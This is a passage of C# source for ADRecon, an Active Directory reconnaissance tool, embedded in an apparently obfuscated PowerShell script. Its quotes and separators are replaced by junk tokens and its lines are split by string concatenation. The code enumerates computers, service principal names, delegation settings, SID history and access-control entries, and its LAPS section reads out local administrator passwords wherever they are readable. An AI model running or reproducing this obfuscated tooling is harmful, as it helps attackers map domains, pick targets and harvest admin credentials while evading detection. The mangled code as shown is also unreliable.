                    PSObject PrinterObj = new PSObject();
                    PrinterObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, AdPrinter.Members[I2ajNameI2aj].Value));
                    PrinterObj.Members.Add(new PSNoteProperty(I2ajServerNameI2aj, AdPrinter.Members[I2ajserverNameI2aj].Value));
                    PrinterObj.Members.Add(new PSNoteProperty(I2ajShareNameI2aj, ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members[I2ajprintShareNameI2aj].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty(I2ajDriverNameI2aj, AdPrinter.Members[I2ajdriverNameI2aj].Value));
                    PrinterObj.Members.Add(new PSNoteProperty(I2ajDriverVersionI2aj, AdPrinter.Members[I2ajdriverVersionI2aj].Value));
                    PrinterObj.Members.Add(new PSNoteProperty(I2ajPortNameI2aj, ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members[I2ajportNameI2aj].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty(I2ajURLI2aj, ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members[I2ajurlI2aj].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty(I2ajwhenCreatedI2aj, AdPrinter.Members[I2ajwhenCreatedI2aj].Value));
                    PrinterObj.Members.Add(new PSNoteProperty(I2ajwhenChangedI2aj, AdPrinter.Members[I2ajwhenChangedI2aj].Value));
                    return new PSObject[] { PrinterObj };
                }
                catch (Exception '+'e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    bool Dormant = false;
                    bool PasswordNotChangedafterMaxAge = false;
                    string SIDHistory = I2ajI2aj;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;

                    if (AdComputer.Members[I2ajLastLogonDateI2aj].Value != null)
                    {
                        //LastLogonDate = DateTime.FromFileTime((long)(AdComputer.Members[I2ajlastLogonTimeStampI2aj].Value));
                        // LastLogonDate is lastLogonTimeStamp converted to local time
                        LastLogonDate = Convert.ToDateTime(AdComputer.Members[I2ajLastLogonDateI2aj].Value);
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    if (AdComputer.Members[I2ajPasswordLastSetI2aj].Value != null)
                    {
                        //PasswordLastSet = DateTime.FromFileTime((long)(AdComputer.Members[I2ajpwdLastSetI2aj].Value));
                        // PasswordLastSet is pwdLastSet converted to local time
                        PasswordLastSet = Convert.ToDateTime(AdComputer.Members[I2ajPasswordLastSetI2aj].Value);
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    if ( ((bool) AdComputer.Members[I2ajTrustedForDelegationI2aj].Value) && ((int) AdComputer.Members[I2ajprimaryGroupIDI2aj].Value == 515) )
                    {
                        DelegationType = I2ajUnconstrainedI2aj;
                        DelegationServices = I2ajAnyI2aj;
                    }
                    if (AdComputer.Members[I2ajmsDS-AllowedToDelegateToI2aj] != null)
                    {
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection delegateto = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members[I2ajmsDS-AllowedToDelegateToI2aj].Value;
                        if (delegateto.Value != null)
                        {
                            DelegationType = I2ajConstrainedI2aj;
                            foreach (var value in delegateto)
                            {
                                DelegationServices = DelegationServices + I2aj,I2aj + Convert.ToString(value);
                            }
                            DelegationServices = DelegationServices.TrimStart(JQTOy,JQTOy);
                        }
                    }
                    if ((bool) AdComputer.Members[I2ajTrustedToAuthForDelegationI2aj].Value)
                    {
                        DelegationProtocol = I2ajAnyI2aj;
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = I2ajKerberosI2aj;
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members[I2ajSIDHistoryI2aj].Value;
                    string sids = I2ajI2aj;
                    foreach (var value in history)
                    {
                        sids = sids + I2aj,I2aj + Convert.ToString(value);
                    }
                    SIDHistory = sids.TrimStart(JQTOy,JQTOy);
                    string OperatingSystem = CleanString((AdComputer.Members[I2ajOperatingSystemI2aj].Value != null ? AdComputer.Members[I2ajOperatingSystemI2aj].Value : I2aj-I2aj) + I2aj I2aj + AdComputer.Members[I2ajOperatingSystemHotfixI2aj].Value + I2aj I2aj + AdComputer.Members[I2ajOperatingSystemServicePackI2aj].Value + I2aj I2aj + AdComputer.Members[I2ajOperatingSystemVersionI2aj].Value);

                    PSObject ComputerObj = new PSObject();
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajUserNameI2aj, CleanString(AdComputer.Members[I2ajSamAccountNameI2aj].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, CleanString(AdComputer.Members[I2ajNameI2aj].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajDNSHostNameI2aj, AdComputer.Members[I2ajDNSHostNameI2aj].Value));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajEnabledI2aj, AdComputer.Members[I2ajEnabledI2aj].Value));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajIPv4AddressI2aj, AdComputer.Members[I2ajIPv4AddressI2aj].Value));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajOperating SystemI2aj, OperatingSystem));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajLogon Age'+' (days)I2aj, DaysSinceLastLogon));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajPassword Age (days)I2aj, DaysSinceLastPasswordChange));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajDormant (> I2aj + DormantTimeSpan + I2aj days)I2aj, Dormant));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajPassword Age (> I2aj + PassMaxAge + I2aj days)I2aj, PasswordNotChangedafterMaxAge));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajDelegation TypeI2aj, DelegationType));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajDelegation ProtocolI2aj, DelegationProtocol));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajDelegation ServicesI2aj, DelegationServices));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajPrimary Group IDI2aj, AdComputer.Members[I2ajprimaryGroupIDI2aj].Value));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajSIDI2aj, AdComputer.Members[I2ajSIDI2aj].Value));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajSIDHistoryI2aj, SIDHistory));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajDescriptionI2aj, CleanString(AdComputer.Members[I2ajDescriptionI2aj].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajms-ds-CreatorSidI2aj, AdComputer.Members[I2ajms-ds-CreatorSidI2aj].Value));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajLast Logon DateI2aj, LastLogonDate));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajPassword LastSetI2aj, PasswordLastSet));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajUserAccountControlI2aj, AdComputer.Mem'+'bers[I2ajUserAccountControlI2aj].Value));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajwhenCreatedI2aj, AdComputer.Members[I2ajwhenCreatedI2aj].Value));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajwhenChangedI2aj, AdComputer.Members[I2ajwhenChangedI2aj].Value));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajDistinguished NameI2aj, AdComputer.Members[I2ajDistinguishedNameI2aj].Value));
                    return new PSObject[] { ComputerObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCo'+'llection) AdComputer.Members[I2ajservicePrincipalNameI2aj].Value;
                    if (SPNs.Value == null)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();

                    foreach (string SPN in SPNs)
                    {
                        bool flag = true;
                        string[] SPNArray = SPN.Split(JQTOy/JQTOy);
                        foreach (PSObject Obj in SPNList)
                        {
         '+'                   if ( (string) Obj.Members[I2ajServiceI2aj].Val'+'ue == SPNArray[0] )
                            {
                                Obj.Members[I2ajHostI2aj].Value = string.Join(I2aj,I2aj, (Obj.Members[I2ajHostI2aj].Value + I2aj,I2aj + SPNArray[1]).Split(JQTOy,JQTOy).Distinct().ToArray());
                                flag = false;
                            }
                        }
                        if (flag)
                        {
                            PSObject ComputerSPNObj = new PSObject();
                            ComputerSPNObj.Members.Add(new PSNoteProperty(I2ajUserNameI2aj, CleanString(AdComputer.Members[I2ajSamAccountNameI2aj].Value)));
                            ComputerSPNObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, CleanString(AdComputer.Members[I2ajNameI2aj].Value)));
                            ComputerSPNObj.Members.Add(new PSNoteProperty(I2ajServiceI2aj, SPNArray[0]));
                            ComputerSPNObj.Members.Add(new PSNoteProperty(I2ajHostI2aj, SPNArray[1]));
                            SPNList.Add( ComputerSPNObj );
                        }
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class LAPSRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    bool PasswordStored = false;
                    DateTime? CurrentExpiration = null;
                    try
                    {
                        CurrentExpiration = DateTime.FromFileTime((long)(AdComputer.Members[I2ajms-Mcs-AdmPwdExpirationTimeI2aj].Value));
                        PasswordStored = true;
            '+'        }
                    catch //(Exception e)
                    {
                        //Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    }
                    PSObject LAPSObj = new PSObject();
                    LAPSObj.Members.Add(new PSNoteProperty(I2ajHostnameI2aj, (AdComputer.Members[I2ajDNSHostNameI2aj].Value != null ? AdComputer.Members[I2ajDNSHostNameI2aj].Value : AdComputer.Members[I2ajCNI2aj].Value )));
                    LAPSObj.Members.Add(new PSNoteProperty(I2ajStoredI2aj, PasswordStored));
                    LAPSObj.Members.Add(new PSNoteProperty(I2ajReadableI2aj, (AdComputer.Members[I2ajms-Mcs-AdmPwdI2aj].Value != null ? true : false)));
                    LAPSObj.Members.Add(new PSNoteProperty(I2ajPasswordI2aj, AdComputer.Members[I2ajms-Mcs-AdmPwdI2aj].Value));
                    LAPSObj.Members.Add(new PSNoteProperty(I2ajExpirationI2aj, CurrentExpiration));
                    return new PSObject[] { LAPSObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class SIDRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    switch (Convert.ToString(AdObject.Members[I2ajObjectClassI2aj].Value))
                    {
                        case I2ajuserI2aj:
                        case I2ajcomputerI2aj:
                        case I2ajgroupI2aj:
                            ADWSClass.AdSIDDictionary.Add(Convert.ToString(AdObject.Members[I2ajobjectsidI2aj].Value), Convert.ToString(AdObject.Members[I2ajNameI2aj].Value));
                            break;
                    }
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajExceptio'+'n caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class DACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    string Name = null;
                    string Type = null;
                    List<PSObject> DACLList = new List<PSObject>();

                    Name = Convert.ToString(A'+'dObject.Members[I2ajNameI2aj].Value);

                    switch (Convert.ToString(AdObject.Members[I2ajobjectClassI2aj].Value))
                    {
                        case I2ajuserI2aj:
                            Type = I2ajUserI2aj;
                            break;
                        case I2ajcomputerI2aj:
                            Type = I2ajComputerI2aj;
                            break;
                        case I2ajgroupI2aj:
                            Type = I2ajGroupI2aj;
                            break;
                        case I2ajcontainerI2aj:
                            Type = I2ajContainerI2aj;
                            break;
                        case I2ajgroupPolicyContainerI2aj:
                            Type = I2ajGPOI2aj;
                            Name = Convert.ToString(AdObject.Members[I2ajDisplayNameI2aj].Value);
                            break;
                        case I2ajorganizationalUnitI2aj:
                            Type = I2ajOUI2aj;
                            break;
                        case I2ajdomainDNSI2aj:
                            Type = I2ajDomainI2aj;
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Members[I2ajobjectClassI2aj].Value);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Members[I2ajntsecuritydescriptorI2aj] != null)
                    {
                        DirectoryObjectSecurity DirObjSec = (DirectoryObjectSecurity) AdObject.Members[I2ajntsecuritydescriptorI2aj].Value;
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            string IdentityReference = Convert.ToString(Rule.IdentityReference);
                            string Owner = Convert.ToString(DirObjSec.GetOwner(typeof(System.Security.Principal.SecurityIdentifier)));
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajTypeI2aj, Type));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajObjectTypeNameI2aj, ADWSClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajInheritedObjectTypeNameI2aj, ADWSClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajActiveDirectoryRightsI2aj, Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajAccessControlTypeI2aj, Rule.AccessControlType));
                         '+'   ObjectObj.Members.Add(new PSNoteProperty(I2ajIdentityReferenceNameI2aj, ADWSClass.AdSIDDictionary.ContainsKey(IdentityReference) ? ADWSClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajOwnerNameI2aj, ADWSClass.AdSIDDictionary.ContainsKey(Owner) ? ADWSClass.AdSIDDictionary[Owner] : Owner));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajInheritedI2aj, Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajObjectFlagsI2aj, Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajInheritanceFlagsI2aj, Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajInheritanceTypeI2aj, Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajPropagationFlagsI2aj, Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajObjectTypeI2aj, Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajInheritedObjectTypeI2aj, Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajIdentityReferenceI2aj, Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajOwnerI2aj, Owner));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajDistinguishedNameI2aj, AdObject.Members[I2ajDistinguishedNameI2aj].Value));
                            DACLList.Add( ObjectObj );
                        }
                    }

                    return DACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

    class SACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    string Name = null;
                    string Type = null;
                    List<PSObject> SACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Members[I2ajNameI2aj].Value);

                    switch (Convert.ToString(AdObject.Members[I2ajobjectClassI2aj].Value))
                    {
               '+'         case I2ajuserI2aj:
                            Type = I2ajUserI2aj;
                            break;
                        case I2ajcomputerI2aj:
                            Type = I2ajComputerI2aj;
                            break;
                        case I2ajgroupI2aj:
                            Type = I2ajGroupI2aj;
                            break;
                        case I2ajcontainerI2aj:
                            Type = I2ajContainerI2aj;
                            break;
                        case I2ajgroupPolicyContainerI2aj:
                            Type = I2ajGPOI2aj;
                            Name = Convert.ToString(AdObject.Members[I2ajDisplayNameI2aj].Value);
                            break;
                        case I2ajorganizationalUnitI2aj:
                            Type = I2ajOUI2aj;
                            break;
                        case I2ajdomainDNSI2aj:
                            Type = I2ajDomainI2aj;
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Members[I2ajobjectClassI2aj].Value);
                            break;
                    }

             '+'       // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Members[I2ajntsecuritydescriptorI2aj] != null)
                    {
                        DirectoryObjectSecurity DirObjSec = (DirectoryObjectSecurity) AdObject.Members[I2ajntsecuritydescriptorI2aj].Value;
                        AuthorizationRuleCollection AuditRules = (AuthorizationRuleCollection) DirObjSec.GetAuditRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAuditRule Rule in AuditRules)
                        {
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajTypeI2aj, Type));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajObjectTypeNameI2aj, ADWSClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajInheritedObjectTypeNameI2aj, ADWSClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajActiveDirectoryRightsI2aj, Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajIdentityReferenceI2aj, Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajAuditFlagsI2aj, Rule.AuditFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajObjectFlagsI2aj, Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNot'+'eProperty(I2ajInheritanceFlagsI2aj, Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajInheritanceTypeI2aj, Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajInheritedI2aj, Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajPropagationFlagsI2aj, Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajObjectTypeI2aj, Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty(I2ajInheritedObjectTypeI2aj, Rule.InheritedObjectType));
                            SACLList.Add( ObjectObj );
                        }
                    }

                    return SACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        //The interface and implmentation class used to handle the results (this implementation just writes the strings to a file)

        interface IResultsHandler
        {
            void processResults(Object[] t);

            Object[] finalise();
        }

        class SimpleResultsHandler : IResultsHandler
        {
            private Object lockObj = new Object();
            private List<Object> processed = new List<Object>();

            public SimpleResultsHandler()
            {
            }'+'

            public void processResults(Object[] results)
            {
                lock (lockObj)
                {
                    if (results.Length != 0)
                    {
                        for (var i = 0; i < results.Length; i++)
                        {
                            processed.Add((PSObject)results[i]);
                        }
                    }
                }
            }

            public Object[] finalise()
            {
                return processed.ToArray();
            }
        }
I2aj@

5I7ELLDAPSource = @I2aj
// Thanks Dennis Albuquerque for the C# multithreading code
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Xml;
using System.Net;
using System.Threading;
using System.DirectoryServices;
using System.Security.Principal;
using System.Security.AccessControl;
usi'+'ng System.Management.Automation;

using System.Diagnostics;
//using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;

namespace ADRecon
{
    public static class LDAPClass
    {
        private static DateTime Date1;
        private static int PassMaxAge;
        private static int DormantTimeSpan;
        private static Dictionary<string, string> AdGroupDictionary = new Dictionary<string, string>();
        private static string DomainSID;
        private static Dictionary<string, string> AdGPODictionary = new Dictionary<string, string>();
        private static Hashtable GUIDs = new Hashtable();
        private static Dictionary<string, string> A'+'dSIDDictionary = new Dictionary<string, string>();
        private static readonly HashSet<string> Groups = new HashSet<string> ( new string[] {I2aj268435456I2aj, I2aj268435457I2aj, I2aj536870912I2aj, I2aj536870913I2aj} );
        private static readonly HashSet<st'+'ring> Users = new HashSet<string> ( new string[] { I2aj805306368I2aj } );
        private static readonly HashSet<string> Computers = new HashSet<string> ( new string[] { I2aj805306369I2aj }) ;
        private static readonly HashSet<string> TrustAccounts = new HashSet<string> ( new string[] { I2aj805306370I2aj } );

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum UACFlags
        {
            SCRIPT = 1,        // 0x1
            ACCOUNTDISABLE = 2,        // 0x2
            HOMEDIR_REQUIRED = 8,        // 0x8
            LOCKOUT = 16,       // 0x10
            PASSWD_NOTREQD = 32,       // 0x20
            PASSWD_CANT_CHANGE = 64,       // 0x40
            ENCRYPTED_TEXT_PASSWORD_ALLOWED = 128,      // 0x80
            TEMP_DUPLICATE_ACCOUNT = 256,      // 0x100
            NORMAL_ACCOUNT = 512,      // 0x200
            INTERDOMAIN_TRUST_ACCOUNT = 2'+'048,     // 0x800
            WORKSTATION_TRUST_ACCOUNT = 4096,     // 0x1000
            SERVER_TRUST_ACCOUNT = 8192,     // 0x2000
            DONT_EXPIRE_PASSWD = 65536,    // 0x10000
            MNS_LOGON_ACCOUNT = 131072,   // 0x20000
            SMARTCARD_REQUIRED = 262144,   // 0x40000
            TRUSTED_FOR_DELEGATION = 524288,   // 0x80000
            NOT_DELEGATED = 1048576,  // 0x100000
            USE_DES_KEY_ONLY = 2097152,  // 0x200000
            DONT_REQUIRE_PREAUTH = 4194304,  // 0x400000
            PASSWORD_EXPIRED = 8388608,  // 0x800000
            TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 16777216, // 0x1000000
            PARTIAL_SECRETS_ACCOUNT = 67108864 // 0x04000000
        }

        [Flags]
        //Values taken from https://blogs.msdn.microsoft.com/openspecification/2011/05/30/windows-configurations-for-kerberos-supported-encryption-type/
        public enum KerbEncFlags
        {
            ZERO = 0,
            DES_CBC_CRC = 1,        // 0x1
            DES_CBC_MD5 = 2,        // 0x2
            RC4_HMAC = 4,        // 0x4
            AES128_CTS_HMAC_SHA1_96 = 8,       // 0x18
            AES256_CTS_HMAC_SHA1_96 = 16       // 0x10
        }

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum GroupTypeFlags
        {
            GLOBAL_GROUP       = 2,            // 0x00000002
            DOMAIN_LOCAL_GROUP = 4,            // 0x00000004
            LOCAL_GROUP        = 4,            // 0x00000004
            UNIVERSAL_GROUP    = 8,            // 0x00000008
            SECURITY_ENABLED   = -2147483648   // 0x80000000
        }

		private static readonly Dictionary<string, string> Replacements = new Dictionary<string, string>()
        {
            //{System.Environment.NewLine, I2ajI2aj},
            '+'//{I2aj,I2aj, I2aj;I2aj},
            {I2ajCOlhgI2ajI2aj, I2ajJQTOyI2aj}
        };

        public static string CleanString(Object StringtoClean)
    '+'    {
            // Remove extra spaces and new lines
            string CleanedString = string.Join(I2aj I2aj, ((Convert.ToString(StringtoClean)).Split((string[]) null, StringSplitOptions.RemoveEmptyEntries)));
            foreach (string Replacement in Replacements.Keys)
            {
                CleanedString = CleanedString.Replace(Replacement, Replacements[Replacement]);
            }
            return CleanedString;
        }

        public static int ObjectCount(Object[] ADRObject)
        {
            return ADRObject.Length;
        }

        public static bool LAPSCheck(Object[] AdComputers)
        {
            bool LAPS = false;
            foreach (SearchResult AdComputer in AdComputers)
            {
                if (AdComputer.Properties[I2ajms-mcs-admpwdexpirationtimeI2aj].Count == 1)
                {
                    LAPS = true;
                    return LAPS;
                }
            }
            return LAPS;
        }

        public static Object[] DomainControllerParser(Object[] AdDomainControllers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdDomainControllers, numOfThreads, I2ajDomainControllersI2aj);
            return ADRObj;
        }

        public static Object[] SchemaParser(Object[] AdSchemas, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdSchemas, numOfThreads, I2ajSchemaHistoryI2aj);
            return ADRObj;
        }

        public static Object[] UserParser(Object[] AdUsers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            LDAPClass.DormantTimeSpan = DormantTimeSpan;
            LDAPClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, I2ajUsersI2aj);
            return ADRObj;
        }

        public static Object[] UserSPNParser(Object[] AdUsers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, I2ajUserSPNsI2aj);
            return ADRObj;
        }

        public static Object[] GroupParser(Object[] AdGroups, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, I2ajGroupsI2aj);
            return ADRObj;
        }

        public static Object[] GroupChangeParser(Object[] AdGroups, DateTime Date1, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            Obje'+'ct[] ADRObj = runProcessor(AdGroups, numOfThreads, I2ajGroupChangesI2aj);
            return ADRObj;
        }

        public static Object[] GroupMemberParser(Object[] AdGroups, Object[] AdGroupMembers, string DomainSID, int numOfThreads)
        {
            LDAPClass.AdGroupDictionary = new Dictionary<string, string>();
            runProcessor(AdGroups, numOfThreads, I2ajGroupsDictionaryI2aj);
            LDAPClass.DomainSID = DomainSID;
            Object[] ADRObj = runProcessor(AdGroupMembers, numOfThreads, I2ajGroupMembersI2aj);
            return ADRObj;
        }

        public static Object[] OUParser(Object[] AdOUs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdOUs, numOfThreads, I2ajOUsI2aj);
            return ADRObj;
        }

        public static Object[] GPOParser(Object[] AdGPOs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGPOs, numOfThreads, I2ajGPOsI2aj);
            return ADRObj;
        }

        public static Object[] SOMParser(Object[] AdGPOs, Object[] AdSOMs, int numOfThreads)
        {
            LDAPClass.AdGPODictionary = new Dictionary<string, string>();
            runProcessor(AdGPOs, numOfThreads, I2ajGPOsDictionaryI2aj);
            Object[] ADRObj = runProcessor(AdSOMs, numOfThreads, I2ajSOMsI2aj);
            return ADRObj;
        }

        public static Object[] PrinterParser(Object[] ADPrinters, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(ADPrinters, numOfThreads, I2ajPrintersI2aj);
            return ADRObj;
        }

        public static Object[] ComputerParser(Object[] AdComputers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            LDAPClass.DormantTimeSpan = DormantTimeSpan;
            LDAPClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, I2ajComputersI2aj);
            return ADRObj;
        }

        public static Object[] ComputerSPNParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, I2ajComputerSPNsI2aj);
            return ADRObj;
        }

        public static Object[] LAPSParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, I2ajLAPSI2aj);
            return ADRObj;
        }

        public static Object[] DACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            LDAPClass.AdSIDDictionary = new Dictionary<string, string>();
            runProcessor(ADObjects, numOfThreads, I2ajSIDDictionaryI2aj);
            LDAPClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, I2ajDACLsI2aj);
            return ADRObj;
        }

        public static Object[] SACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            LDAPClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, I2ajSACLsI2aj);
            return ADRObj;
        }

        static Object[] runProcessor(Object[] arrayToProcess, int numOfThreads, string processorType)
        {
            int totalRecords = arrayToProcess.Length;
            IRecordProcessor recordProcessor = recordProcessorFactory(processorType);
            IResultsHandler resultsHandler = new SimpleResultsHandler ();
            int numberOfRecordsPerThread = totalRecords / numOfThreads;
            int remainders = totalRecords % numOfThreads;

            Thread[] threads = new Thread[numOfThreads];
            for (int i = 0; i < numOfThreads; i++)
            {
                int numberOfRecordsToProcess = numberOfRecordsPerThread;
                if (i == (numOfThreads - 1))
    '+'            {
                    //last thread, do the remaining records
                    numberOfRecordsToProcess += remainders;
                }

